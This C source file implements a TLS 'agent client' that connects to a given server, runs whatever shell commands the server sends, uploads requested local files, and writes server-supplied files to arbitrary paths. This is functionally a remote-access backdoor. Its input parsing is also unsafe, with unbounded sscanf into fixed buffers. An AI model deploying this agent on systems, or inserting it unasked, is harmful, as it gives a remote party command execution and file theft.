#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <errno.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define BUFFER_SIZE 4096
#define CONNECT_RETRY_INTERVAL 5
#define FILE_START_MARKER "file_start:"
#define FILE_END_MARKER "file_end"

#ifndef LOG_INFO
#define LOG_INFO printf
#endif
#ifndef LOG_ERROR
#define LOG_ERROR printf
#endif

SSL_CTX *ctx;

void init_ssl_context() {
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();

    ctx = SSL_CTX_new(SSLv23_client_method());
    if (!ctx) {
        LOG_ERROR("SSL_CTX_new failed\n");
        ERR_print_errors_fp(stderr);
        exit(1);
    }

    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
    LOG_INFO("SSL context initialized\n");
}

static void run_client(const char *server_ip, const int port, const char *dev_uid) {
    int sock = -1;
    SSL *ssl = NULL;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];

    init_ssl_context();

    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            LOG_ERROR("Socket creation failed: %s\n", strerror(errno));
            sleep(CONNECT_RETRY_INTERVAL);
            continue;
        }
        LOG_INFO("Socket created successfully\n");

        struct timeval tv = {5, 0};
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv));
        LOG_INFO("Socket timeout set to 5 seconds\n");

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons((unsigned short)port);
        if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {
            LOG_ERROR("Invalid server IP address: %s\n", server_ip);
            close(sock);
            sleep(CONNECT_RETRY_INTERVAL);
            continue;
        }
        LOG_INFO("Server address set to %s:%d\n", server_ip, port);

        LOG_INFO("Trying to connect to server %s:%d (PID: %d)...\n", server_ip, port, getpid());
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
            LOG_ERROR("Connect failed: %s\n", strerror(errno));
            close(sock);
            sleep(CONNECT_RETRY_INTERVAL);
            continue;
        }
        LOG_INFO("TCP connection established\n");

        ssl = SSL_new(ctx);
        if (!ssl) {
            LOG_ERROR("SSL_new failed\n");
            ERR_print_errors_fp(stderr);
            close(sock);
            sleep(CONNECT_RETRY_INTERVAL);
            continue;
        }
        SSL_set_fd(ssl, sock);
        int ssl_ret = SSL_connect(ssl);
        if (ssl_ret <= 0) {
            LOG_ERROR("SSL_connect failed, error: %d\n", SSL_get_error(ssl, ssl_ret));
            ERR_print_errors_fp(stderr);
            SSL_free(ssl);
            close(sock);
            sleep(CONNECT_RETRY_INTERVAL);
            continue;
        }
        LOG_INFO("SSL handshake completed successfully on port %d\n", port);

        char uid_msg[BUFFER_SIZE];
        snprintf(uid_msg, sizeof(uid_msg), "I am agent client, my uid is %s", dev_uid);
        int write_ret = SSL_write(ssl, uid_msg, strlen(uid_msg));
        if (write_ret <= 0) {
            LOG_ERROR("SSL_write failed for UID, error: %d\n", SSL_get_error(ssl, write_ret));
            ERR_print_errors_fp(stderr);
            SSL_free(ssl);
            close(sock);
            sleep(CONNECT_RETRY_INTERVAL);
            continue;
        }
        LOG_INFO("Sent UID: %s (%d bytes)\n", uid_msg, write_ret);

        int bytes_received = SSL_read(ssl, buffer, BUFFER_SIZE - 1);
        if (bytes_received <= 0) {
            LOG_ERROR("SSL_read failed for server response, error: %d\n", SSL_get_error(ssl, bytes_received));
            ERR_print_errors_fp(stderr);
            SSL_free(ssl);
            close(sock);
            sleep(CONNECT_RETRY_INTERVAL);
            continue;
        }
        buffer[bytes_received] = '\0';
        LOG_INFO("Received server response: %s (%d bytes)\n", buffer, bytes_received);

        char expected_response[BUFFER_SIZE];
        snprintf(expected_response, sizeof(expected_response), "hello, %s", dev_uid);
        if (strcmp(buffer, expected_response) != 0) {
            LOG_ERROR("Server response mismatch, received: %s, expected: %s\n", buffer, expected_response);
            SSL_free(ssl);
            close(sock);
            sleep(CONNECT_RETRY_INTERVAL);
            continue;
        }
        LOG_INFO("Authentication successful, received: %s\n", expected_response);

        while (1) {
            fd_set readfds;
            struct timeval tv = {5, 0};
            FD_ZERO(&readfds);
            FD_SET(sock, &readfds);

            LOG_INFO("Waiting for server command (select timeout: 5s)\n");
            int ret = select(sock + 1, &readfds, NULL, NULL, &tv);
            if (ret == -1) {
                LOG_ERROR("Select failed: %s\n", strerror(errno));
                break;
            } else if (ret == 0) {
                char heartbeat[] = "heartbeat";
                write_ret = SSL_write(ssl, heartbeat, strlen(heartbeat));
                if (write_ret <= 0) {
                    LOG_ERROR("SSL_write failed for heartbeat, error: %d\n", SSL_get_error(ssl, write_ret));
                    ERR_print_errors_fp(stderr);
                    break;
                }
                LOG_INFO("Sent heartbeat message (%d bytes)\n", write_ret);
                continue;
            }

            bytes_received = SSL_read(ssl, buffer, BUFFER_SIZE - 1);
            if (bytes_received <= 0) {
                LOG_ERROR("SSL_read failed, error: %d\n", SSL_get_error(ssl, bytes_received));
                ERR_print_errors_fp(stderr);
                break;
            }
            buffer[bytes_received] = '\0';
            LOG_INFO("Received command: %s (%d bytes)\n", buffer, bytes_received);

            char result[BUFFER_SIZE] = {0};
            int offset = 0;
            char received_uid[33];
            char command[BUFFER_SIZE];
            long file_size;
            char file_path[BUFFER_SIZE];

            if (sscanf(buffer, "uid:%32s %[^\n]", received_uid, command) == 2) {
                if (strcmp(received_uid, dev_uid) == 0) {
                    LOG_INFO("UID matched, processing command: %s\n", command);

                    if (strcmp(command, "exit") == 0) {
                        LOG_INFO("Received exit command, reconnecting\n");
                        break;
                    }

                    if (sscanf(command, "get_file %s %s", file_path, result) == 2) {
                        LOG_INFO("Processing get_file: %s -> %s\n", file_path, result);
                        struct stat st;
                        if (stat(file_path, &st) == -1 || !S_ISREG(st.st_mode)) {
                            offset += snprintf(result + offset, sizeof(result) - offset,
                                               "Source path %s must be a file\n", file_path);
                            LOG_ERROR("Invalid file path: %s\n", file_path);
                        } else {
                            int fd = open(file_path, O_RDONLY);
                            if (fd == -1) {
                                offset += snprintf(result + offset, sizeof(result) - offset,
                                                   "Cannot open file %s: %s\n", file_path, strerror(errno));
                                LOG_ERROR("Failed to open file %s: %s\n", file_path, strerror(errno));
                            } else {
                                off_t file_size = st.st_size;
                                char file_start[BUFFER_SIZE];
                                snprintf(file_start, sizeof(file_start), FILE_START_MARKER "%ld:%s", (long)file_size, result);
                                write_ret = SSL_write(ssl, file_start, strlen(file_start));
                                if (write_ret <= 0) {
                                    LOG_ERROR("SSL_write failed for file_start, error: %d\n", SSL_get_error(ssl, write_ret));
                                    ERR_print_errors_fp(stderr);
                                    close(fd);
                                    break;
                                }
                                LOG_INFO("Sent file_start: %s (%d bytes)\n", file_start, write_ret);

                                char file_buffer[BUFFER_SIZE];
                                ssize_t bytes_read;
                                size_t total_sent = 0;
                                while (total_sent < file_size && (bytes_read = read(fd, file_buffer, BUFFER_SIZE)) > 0) {
                                    write_ret = SSL_write(ssl, file_buffer, bytes_read);
                                    if (write_ret <= 0) {
                                        LOG_ERROR("SSL_write failed for file data, error: %d\n", SSL_get_error(ssl, write_ret));
                                        ERR_print_errors_fp(stderr);
                                        close(fd);
                                        break;
                                    }
                                    total_sent += bytes_read;
                                    LOG_INFO("Sent %d bytes of file data\n", write_ret);
                                }
                                close(fd);
                                if (total_sent == file_size) {
                                    write_ret = SSL_write(ssl, FILE_END_MARKER, strlen(FILE_END_MARKER));
                                    if (write_ret <= 0) {
                                        LOG_ERROR("SSL_write failed for file_end, error: %d\n", SSL_get_error(ssl, write_ret));
                                        ERR_print_errors_fp(stderr);
                                        break;
                                    }
                                    LOG_INFO("Sent " FILE_END_MARKER " (%d bytes)\n", write_ret);
                                    offset += snprintf(result + offset, sizeof(result) - offset,
                                                       "Sent file %s, size %ld bytes\n", file_path, file_size);
                                } else {
                                    offset += snprintf(result + offset, sizeof(result) - offset,
                                                       "Failed to send file %s completely, sent %zu of %ld bytes\n", file_path, total_sent, file_size);
                                    LOG_ERROR("Incomplete file send: %zu/%ld bytes\n", total_sent, file_size);
                                }
                            }
                        }
                    } else {
                        LOG_INFO("Executing command: %s\n", command);
                        FILE *fp = popen(command, "r");
                        if (fp == NULL) {
                            offset += snprintf(result + offset, sizeof(result) - offset,
                                               "Command '%s' execution failed: %s\n", command, strerror(errno));
                            LOG_ERROR("popen failed: %s\n", strerror(errno));
                        } else {
                            LOG_INFO("popen succeeded, reading output\n");
                            size_t total_len = fread(result, 1, BUFFER_SIZE - 1, fp);
                            if (ferror(fp)) {
                                LOG_ERROR("fread error occurred\n");
                                offset += snprintf(result + offset, sizeof(result) - offset,
                                                   "fread error occurred\n");
                            } else {
                                result[total_len] = '\0';
                                LOG_INFO("Read %zu bytes from command output: %s\n", total_len, result);
                                int pclose_ret = pclose(fp);
                                if (pclose_ret == -1) {
                                    offset += snprintf(result + offset, sizeof(result) - offset,
                                                       "Command '%s' closing failed: %s\n", command, strerror(errno));
                                    LOG_ERROR("pclose failed: %s\n", strerror(errno));
                                } else if (WIFEXITED(pclose_ret) && WEXITSTATUS(pclose_ret) != 0) {
                                    offset += snprintf(result + offset, sizeof(result) - offset,
                                                       "Command '%s' failed with exit status %d\n", command, WEXITSTATUS(pclose_ret));
                                    LOG_ERROR("Command '%s' exited with status %d\n", command, WEXITSTATUS(pclose_ret));
                                } else {
                                    if (total_len == BUFFER_SIZE - 1) {
                                        LOG_INFO("Command '%s' output exceeds %d bytes, truncated\n", command, BUFFER_SIZE - 1);
                                    }
                                    LOG_INFO("Command '%s' executed successfully, output: %s\n", command, result);
                                    if (total_len == 0) {
                                        offset += snprintf(result + offset, sizeof(result) - offset,
                                                           "Command '%s' produced no output\n", command);
                                        LOG_INFO("No output from command\n");
                                    }
                                }
                            }
                        }
                    }
                } else {
                    offset += snprintf(result + offset, sizeof(result) - offset,
                                       "UID mismatch: received %s, expected %s\n", received_uid, dev_uid);
                    LOG_ERROR("UID mismatch: received %s, expected %s\n", received_uid, dev_uid);
                }
            } else if (sscanf(buffer, FILE_START_MARKER "%ld:%s", &file_size, file_path) == 2) {
                LOG_INFO("Receiving file: %s, size: %ld bytes\n", file_path, file_size);
                char *dir = strdup(file_path);
                char *slash = strrchr(dir, '/');
                if (slash) {
                    *slash = '\0';
                    if (mkdir(dir, 0755) == -1 && errno != EEXIST) {
                        offset += snprintf(result + offset, sizeof(result) - offset,
                                           "Cannot create directory %s: %s\n", dir, strerror(errno));
                        LOG_ERROR("Failed to create directory %s: %s\n", dir, strerror(errno));
                    }
                }
                free(dir);

                int fd = open(file_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                if (fd == -1) {
                    offset += snprintf(result + offset, sizeof(result) - offset,
                                       "Cannot create file %s: %s\n", file_path, strerror(errno));
                    LOG_ERROR("Failed to create file %s: %s\n", file_path, strerror(errno));
                } else {
                    size_t received = 0;
                    while (received < file_size) {
                        size_t remaining = file_size - received;
                        size_t to_receive = (remaining < BUFFER_SIZE) ? remaining : BUFFER_SIZE;
                        bytes_received = SSL_read(ssl, buffer, to_receive);
                        if (bytes_received <= 0) {
                            offset += snprintf(result + offset, sizeof(result) - offset,
                                               "Failed to receive file data: %s\n", strerror(errno));
                            LOG_ERROR("SSL_read failed during file receive, error: %d\n", SSL_get_error(ssl, bytes_received));
                            close(fd);
                            break;
                        }
                        write(fd, buffer, bytes_received);
                        received += bytes_received;
                        LOG_INFO("Received %d bytes of file data, total: %zu/%ld\n", bytes_received, received, file_size);
                    }
                    close(fd);
                    if (received == file_size) {
                        bytes_received = SSL_read(ssl, buffer, strlen(FILE_END_MARKER));
                        if (bytes_received <= 0) {
                            LOG_ERROR("SSL_read failed for file_end, error: %d\n", SSL_get_error(ssl, bytes_received));
                            break;
                        }
                        LOG_INFO("Received %d bytes for file_end: %.*s\n", bytes_received, bytes_received, buffer);
                        if (bytes_received == strlen(FILE_END_MARKER) && strncmp(buffer, FILE_END_MARKER, strlen(FILE_END_MARKER)) == 0) {
                            offset += snprintf(result + offset, sizeof(result) - offset,
                                               "File saved to %s, size %ld bytes\n", file_path, file_size);
                            LOG_INFO("File transfer completed: %s\n", file_path);
                        } else {
                            offset += snprintf(result + offset, sizeof(result) - offset,
                                               "Expected " FILE_END_MARKER ", received %d bytes: %.*s\n", bytes_received, bytes_received, buffer);
                            LOG_ERROR("File end marker mismatch\n");
                        }
                    } else {
                        offset += snprintf(result + offset, sizeof(result) - offset,
                                           "File %s received incompletely, expected %ld bytes, got %zu bytes\n", file_path, file_size, received);
                        LOG_ERROR("Incomplete file receive: %zu/%ld bytes\n", received, file_size);
                    }
                }
            } else {
                offset += snprintf(result + offset, sizeof(result) - offset,
                                   "Command format error: %s\n", buffer);
                LOG_ERROR("Invalid command format: %s\n", buffer);
            }

            LOG_INFO("Sending result back to server: %s\n", result);
            write_ret = SSL_write(ssl, result, strlen(result));
            if (write_ret <= 0) {
                LOG_ERROR("SSL_write failed for result, error: %d\n", SSL_get_error(ssl, write_ret));
                ERR_print_errors_fp(stderr);
                break;
            }
            LOG_INFO("Successfully sent result to server (%d bytes)\n", write_ret);
        }

        LOG_INFO("Connection lost, cleaning up...\n");
        SSL_free(ssl);
        close(sock);
        sock = -1;
        ssl = NULL;
        LOG_INFO("Retrying connection in %d seconds...\n", CONNECT_RETRY_INTERVAL);
        sleep(CONNECT_RETRY_INTERVAL);
    }

    SSL_CTX_free(ctx);
    LOG_INFO("SSL context freed, client exiting\n");
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <server_ip> <port> <uid>\n", argv[0]);
        return 1;
    }
    int port = atoi(argv[2]);
    if (port <= 0 || port > 65535) {
        fprintf(stderr, "Port must be between 1 and 65535\n");
        return 1;
    }
    LOG_INFO("Starting client with IP: %s, Port: %d, UID: %s\n", argv[1], port, argv[3]);
    run_client(argv[1], port, argv[3]);
    return 0;
}
